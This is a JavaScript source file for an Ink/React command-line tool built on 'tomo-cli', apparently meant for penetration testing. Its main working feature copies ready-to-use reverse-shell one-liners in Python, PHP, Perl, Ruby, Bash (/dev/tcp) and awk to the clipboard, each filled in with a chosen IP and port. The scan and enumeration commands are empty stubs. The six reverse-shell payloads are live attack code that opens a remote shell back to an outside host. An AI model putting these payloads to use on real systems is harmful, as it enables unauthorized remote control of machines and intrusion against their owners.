import React, {Component} from 'react';
import PropTypes from 'prop-types';
import clipboard from 'clipboardy';
import {bold} from 'chalk';
// import figures from 'figures';
import {is} from 'ramda';
import {Color, Text} from 'ink';
import {
    ErrorBoundary,
    SubCommandSelect,
    TaskList,
    UnderConstruction,
    Warning,
    getIntendedInput
} from 'tomo-cli';

const descriptions = {
    enum: 'Enumerate stuff',
    scan: 'Scan stuff',
    'reverse shell (php)': `Copy one-line reverse shell written in ${bold.magenta('PHP')}`,
    'reverse shell (python)': `Copy one-line reverse shell written in ${bold.yellow('Python')}`,
    'reverse shell (perl)': `Copy one-line reverse shell written in ${bold.blue('Perl')}`,
    'reverse shell (ruby)': `Copy one-line reverse shell written in ${bold.red('Ruby')}`,
    'reverse shell (bash)': `Copy one-line reverse shell written in ${bold.bgBlack.white(' Bash ')}`,
    'reverse shell (awk)': `Copy one-line reverse shell written in ${bold.bgBlack.white(' awk ')}`
};

const commands = {
    copy: {
        'reverse shell (python)': [
            {
                text: 'Copy Python reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (php)': [
            {
                text: 'Copy PHP reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (perl)': [
            {
                text: 'Copy Perl reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (ruby)': [
            {
                text: 'Copy Ruby reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (bash)': [
            {
                text: 'Copy Bash reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ],
        'reverse shell (awk)': [
            {
                text: 'Copy awk reverse shell to clipboard',
                task: async ({ip, port}) => {
                    const cmd = `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
                    await clipboard.write(cmd);
                },
                condition: () => true
            }
        ]
    },
    scan: {
        ports: [
            {
                text: 'Test',
                task: async () => {},
                condition: () => true
            }
        ]
    },
    enum: {
        web: [

        ],
        snmp: [

        ],
        smb: [

        ],
        smtp: [

        ]
    }
};

/**
 * Main tomo UI component
 * @param {Object} props Component props
 * @return {ReactComponent} Main tomo UI component
 */
export default class UI extends Component {
    constructor(props) {
        super(props);
        const {flags, input} = props;
        const {ignoreWarnings} = flags;
        const [command, ...terms] = input;
        const hasCommand = is(String)(command);
        const hasTerms = terms.length > 0;
        const {intendedCommand, intendedTerms} = hasCommand ? getIntendedInput(commands, command, terms) : {};
        const compare = (term, index) => (term !== terms[index]);
        const showWarning = ((command !== intendedCommand) || (hasTerms && intendedTerms.map(compare).some(Boolean))) && !ignoreWarnings;
        this.state = {
            hasTerms,
            hasCommand,
            showWarning,
            intendedTerms,
            intendedCommand
        };
        this.updateWarning = this.updateWarning.bind(this);
        this.updateTerms = this.updateTerms.bind(this);
    }
    render() {
        const {done, flags} = this.props;
        const {hasCommand, hasTerms, intendedCommand, intendedTerms, showWarning} = this.state;
        return <ErrorBoundary>
            {showWarning ?
                <Warning callback={this.updateWarning}>
                    <Text>Did you mean <Color bold green>{intendedCommand} {intendedTerms.join(' ')}</Color>?</Text>
                </Warning> :
                (hasCommand && hasTerms) ?
                    <TaskList commands={commands} command={intendedCommand} terms={intendedTerms} options={flags} done={done}></TaskList> :
                    hasCommand ?
                        <SubCommandSelect
                            command={intendedCommand}
                            descriptions={descriptions}
                            items={Object.keys(commands[intendedCommand]).map(command => ({label: command, value: command}))}
                            onSelect={this.updateTerms}>
                        </SubCommandSelect> :
                        <UnderConstruction/>
            }
        </ErrorBoundary>;
    }
    /**
     * Callback function for warning component
     * @param {string} data Character data from stdin
     * @return {undefined} Returns nothing
     */
    updateWarning(data) {
        const key = String(data);
        (key === '\r') ? this.setState({showWarning: false}) : process.exit(0);
    }
    /**
     * @param {Object} args Function options
     * @param {string} args.value Intended term
     * @return {undefined} Returns nothing
     */
    updateTerms({value}) {
        this.setState({
            hasTerms: true,
            intendedTerms: [value]
        });
    }
}
UI.propTypes = {
    input: PropTypes.array,
    flags: PropTypes.object,
    done: PropTypes.func,
    stdin: PropTypes.string
};
UI.defaultProps = {
    input: [],
    flags: {}
};